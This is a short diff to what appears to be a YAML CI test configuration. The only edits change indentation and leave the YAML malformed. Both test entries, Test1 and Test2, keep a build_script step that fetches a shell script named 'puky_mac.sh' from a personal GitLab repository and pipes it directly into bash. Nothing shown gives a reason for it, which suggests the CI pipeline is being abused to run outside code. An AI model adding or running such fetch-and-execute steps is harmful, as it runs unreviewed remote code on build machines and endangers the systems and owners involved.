@@ -8,9 +8,9 @@ build:
 
 test:
   categories:
-  - - Test1
+- Test1
       build_script:
     - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
-  - - Test2
+- Test2
       build_script:
     - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
